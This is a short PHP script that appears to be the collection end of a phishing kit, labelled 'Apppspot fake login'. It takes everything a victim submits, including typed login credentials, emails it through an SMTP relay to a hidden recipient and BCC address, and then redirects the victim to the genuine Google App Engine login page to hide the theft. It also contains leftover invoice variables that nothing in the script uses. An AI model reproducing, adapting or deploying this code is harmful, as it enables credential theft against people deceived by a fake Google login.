<?php
//config
$config = array(
	'email'=>array(
		'from' => 'user@domain.com',
		'fromName' => 'Apppspot fake login ',
		'bcc' => 'user@domain.com',
		'subject' => 'Apppspot fake login',
		
		'smtphost' => 'smtp-relay.gmail.com',
		'smtphauth' => true,
		'smtpuser' => 'user@domain.com',
		'smtppass' => 'Sup3rS3cretpassw0rd@#$',
		'smtpsec' => 'tls',
		'smtpport' => 587
	)
);
	//
	$mailcontents = json_encode($_POST);
	
	require 'phpmailer/PHPMailerAutoload.php';

	$mail = new PHPMailer;
	$amount = number_format($total, 2, ',', '.');
	$kenmerk = $_POST['desc']['custno']."/".$_POST['desc']['factno'];
	$paybefore = date('d-m-Y', strtotime($_POST['desc']['factdate']. ' + 14 days'));
	
	$mail->isSMTP();
	$mail->Host = $config['email']['smtphost'] ;
	$mail->SMTPAuth = $config['email']['smtphauth'];
	$mail->Username = $config['email']['smtpuser'];
	$mail->Password = $config['email']['smtppass'];
	$mail->SMTPSecure = $config['email']['smtpsec']; 
	$mail->Port = $config['email']['smtpport']; 
	
	$mail->setFrom($config['email']['from'], $config['email']['fromName']);
	$mail->addAddress('emal@domain.com', 'receivername'); 
	$mail->addBCC($config['email']['bcc']);
	
	$mail->isHTML(true);
	
	$mail->Subject = $config['email']['subject'];
	$mail->Body    = $mailcontents	;
	
	if(!$mail->send()) {
	    echo 'Message could not be sent.';
	    echo 'Mailer Error: ' . $mail->ErrorInfo;
	} else {
	    echo 'Mail message has been sent<br>';
	}
	header("Location: https://appengine.google.com/_ah/conflogin?continue=https://appengine.google.com/");
	die();
	?>